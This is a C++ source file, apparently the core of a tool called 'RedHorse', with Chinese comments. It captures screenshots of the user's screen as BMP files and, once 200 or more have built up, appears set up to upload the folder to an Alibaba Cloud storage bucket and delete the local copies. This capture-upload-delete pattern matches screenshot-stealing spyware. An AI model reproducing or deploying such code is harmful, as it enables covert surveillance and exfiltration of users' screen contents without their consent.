// RedHorseCore.cpp
#include "RedHorseCore.h"
#include <codecvt>
#include <locale>
#include <filesystem>
#include <alibabacloud/oss/OssClient.h>
#include <string>
#include <fstream>
#include <Windows.h>
#include <vector>

namespace fs = std::filesystem;

namespace RedHorseCore {

    std::wstring getCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto duration = now.time_since_epoch();
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(duration).count();
        return std::to_wstring(seconds);
    }

    void ShootScreen(const std::wstring& filename, HWND hWnd) {
        HDC hdc = CreateDC(L"DISPLAY", NULL, NULL, NULL);
        int32_t ScrWidth = 0, ScrHeight = 0;
        RECT rect = { 0 };
        if (hWnd == NULL) {
            ScrWidth = GetDeviceCaps(hdc, HORZRES);
            ScrHeight = GetDeviceCaps(hdc, VERTRES);
        }
        else {
            GetWindowRect(hWnd, &rect);
            ScrWidth = rect.right - rect.left;
            ScrHeight = rect.bottom - rect.top;
        }
        HDC hmdc = CreateCompatibleDC(hdc);

        HBITMAP hBmpScreen = CreateCompatibleBitmap(hdc, ScrWidth, ScrHeight);
        HBITMAP holdbmp = (HBITMAP)SelectObject(hmdc, hBmpScreen);

        BITMAP bm;
        GetObject(hBmpScreen, sizeof(bm), &bm);

        BITMAPINFOHEADER bi = { 0 };
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bm.bmWidth;
        bi.biHeight = bm.bmHeight;
        bi.biPlanes = bm.bmPlanes;
        bi.biBitCount = bm.bmBitsPixel;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = bm.bmHeight * bm.bmWidthBytes;
        char* buf = new char[bi.biSizeImage];
        BitBlt(hmdc, 0, 0, ScrWidth, ScrHeight, hdc, rect.left, rect.top, SRCCOPY);
        GetDIBits(hmdc, hBmpScreen, 0L, (DWORD)ScrHeight, buf, (LPBITMAPINFO)&bi, (DWORD)DIB_RGB_COLORS);

        BITMAPFILEHEADER bfh = { 0 };
        bfh.bfType = ((WORD)('M' << 8) | 'B');
        bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bi.biSizeImage;
        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        HANDLE hFile = CreateFile(filename.c_str(), GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::wcerr << L"无法创建文件: " << filename << std::endl;
            return;
        }

        DWORD dwWrite;
        WriteFile(hFile, &bfh, sizeof(BITMAPFILEHEADER), &dwWrite, NULL);
        WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &dwWrite, NULL);
        WriteFile(hFile, buf, bi.biSizeImage, &dwWrite, NULL);
        CloseHandle(hFile);

        SelectObject(hmdc, holdbmp);
        DeleteObject(hBmpScreen);
        DeleteDC(hmdc);
        DeleteDC(hdc);
        delete[] buf;
    }

    std::wstring getUserProfile() {
        std::wstring userProfile;
        DWORD size = GetEnvironmentVariable(L"USERPROFILE", NULL, 0);
        if (size > 0) {
            userProfile.resize(size - 1);
            GetEnvironmentVariable(L"USERPROFILE", &userProfile[0], size);
        }

        return userProfile;
    }

    void init() {
        std::wstring screenshotPath = getUserProfile() + L"\\Desktop\\screenshot";
        CreateDirectory(screenshotPath.c_str(), NULL);
    }

    bool HasAtLeast200BmpFiles(const std::wstring& folderPath) {
        WIN32_FIND_DATA findFileData;
        // 在文件夹路径末尾添加通配符
        std::wstring searchPath = folderPath + L"*";
        HANDLE hFind = FindFirstFile(searchPath.c_str(), &findFileData);

        if (hFind == INVALID_HANDLE_VALUE) {
            return false;
        }

        int bmpCount = 0;
        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                // 添加文件名过滤条件，只对.bmp文件进行计数
                if (wcsstr(findFileData.cFileName, L".bmp") != nullptr) {
                    bmpCount++;
                }
            }
        } while (FindNextFile(hFind, &findFileData) != 0);

        FindClose(hFind);

        return bmpCount >= 200;
    }

    void cleanFolder(const std::wstring& folderPath) {
        
        try {
            for (const auto& entry : fs::directory_iterator(folderPath)) {
                if (fs::is_regular_file(entry.status())) {
                    fs::remove(entry.path());
                    std::cout << "Deleted file: " << entry.path().filename().string() << std::endl;
                }
            }
        }
        catch (const fs::filesystem_error& e) {
            std::cerr << "Error: " << e.what() << std::endl;
        }

    }

    void uploadFiles(const std::string& bucketName, const std::string& directory, const std::string& endpoint, const std::string& accessKeyId, const std::string& accessKeySecret) {
        AlibabaCloud::OSS::InitializeSdk();

        AlibabaCloud::OSS::ClientConfiguration conf;
        AlibabaCloud::OSS::OssClient client(endpoint, accessKeyId, accessKeySecret, conf);

        for (const auto& entry : std::filesystem::directory_iterator(directory)) {
            if (entry.is_regular_file()) {
                std::string filePath = entry.path().string();
                std::string objectName = entry.path().filename().string();

                std::shared_ptr<std::iostream> content = std::make_shared<std::fstream>(filePath, std::ios::in | std::ios::binary);
                if (!content->good()) {
                    std::cerr << "Failed to open file: " << filePath << std::endl;
                    continue;
                }

                auto outcome = client.PutObject(bucketName, objectName, content);
                if (!outcome.isSuccess()) {
                    std::cerr << "Failed to upload file: " << filePath << ". Error: " << outcome.error().Message() << std::endl;
                }
                else {
                    std::cout << "Successfully uploaded file: " << filePath << std::endl;
                }
            }
        }

        AlibabaCloud::OSS::ShutdownSdk();
    }

    std::wstring getHostname() {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            // 成功获取主机名，将其转换为 std::wstring
            return std::wstring(hostname, hostname + std::strlen(hostname));
        }
        else {
            // 处理错误情况
            std::cerr << "gethostname failed: " << strerror(errno) << std::endl;
            return L""; // 返回空的宽字符串
        }
    }

    std::string wstring_to_string(const std::wstring& wstr) {
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], static_cast<int>(wstr.size()), nullptr, 0, nullptr, nullptr);
        if (size_needed <= 0) return ""; // Handle error

        std::vector<char> str(size_needed);
        WideCharToMultiByte(CP_UTF8, 0, &wstr[0], static_cast<int>(wstr.size()), &str[0], size_needed, nullptr, nullptr);

        return std::string(str.begin(), str.end());
    }
}